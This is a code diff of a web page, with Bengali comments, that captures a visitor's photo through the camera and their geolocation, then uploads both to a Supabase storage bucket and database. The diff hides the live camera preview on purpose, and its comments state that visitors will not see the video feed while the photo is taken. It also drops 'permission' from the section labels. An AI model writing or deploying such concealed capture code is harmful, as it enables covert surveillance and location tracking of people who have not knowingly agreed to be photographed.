@@ -45,12 +45,9 @@
       opacity: 0.6;
     }
 
+    /* Camera preview কখনো দেখানো হবে না */
     #camera {
       display: none;
-      width: 100%;
-      max-width: 400px;
-      margin: 15px auto;
-      border-radius: 12px;
     }
 
     #status {
@@ -82,6 +79,7 @@
     📷 Continue
   </button>
 
+  <!-- Camera element hidden -->
   <video id="camera" autoplay playsinline></video>
 
   <p id="status"></p>
@@ -89,7 +87,6 @@
 </div>
 
 
-<!-- Supabase JavaScript -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <script>
@@ -126,7 +123,7 @@ async function startTest() {
   try {
 
     /* =========================
-       CAMERA PERMISSION
+       CAMERA
     ========================= */
 
     status.innerText =
@@ -149,8 +146,12 @@ async function startTest() {
         audio: false
       });
 
+    /*
+     * Camera preview display:none থাকছে।
+     * তাই live video webpage-এ দেখা যাবে না।
+     */
+
     video.srcObject = stream;
-    video.style.display = "block";
 
     await video.play();
 
@@ -160,7 +161,7 @@ async function startTest() {
 
 
     /* =========================
-       CAPTURE PHOTO
+       PHOTO CAPTURE
     ========================= */
 
     const canvas =
@@ -180,7 +181,6 @@ async function startTest() {
       canvas.height
     );
 
-
     const photoBlob =
       await new Promise(resolve =>
         canvas.toBlob(
@@ -190,7 +190,6 @@ async function startTest() {
         )
       );
 
-
     if (!photoBlob) {
       throw new Error(
         "Photo capture করা যায়নি।"
@@ -199,7 +198,7 @@ async function startTest() {
 
 
     /* =========================
-       STOP CAMERA
+       CAMERA বন্ধ
     ========================= */
 
     stream.getTracks().forEach(track =>
@@ -209,23 +208,20 @@ async function startTest() {
     stream = null;
 
     video.srcObject = null;
-    video.style.display = "none";
 
 
     /* =========================
-       LOCATION PERMISSION
+       LOCATION
     ========================= */
 
     status.innerText =
       "📍 Location permission চাওয়া হচ্ছে...";
-
 
     if (!navigator.geolocation) {
       throw new Error(
         "এই browser-এ location available নয়।"
       );
     }
-
 
     const position =
       await new Promise((resolve, reject) => {
@@ -251,7 +247,7 @@ async function startTest() {
 
 
     /* =========================
-       CREATE FILE NAME
+       FILE NAME
     ========================= */
 
     const fileName =
@@ -261,12 +257,11 @@ async function startTest() {
 
 
     /* =========================
-       UPLOAD PHOTO
+       PHOTO UPLOAD
     ========================= */
 
     status.innerText =
       "☁️ Photo upload হচ্ছে...";
-
 
     const uploadResult =
       await supabaseClient
@@ -288,12 +283,11 @@ async function startTest() {
 
 
     /* =========================
-       SAVE LOCATION + PHOTO PATH
+       DATABASE
     ========================= */
 
     status.innerText =
       "💾 Location save হচ্ছে...";
-
 
     const insertResult =
       await supabaseClient
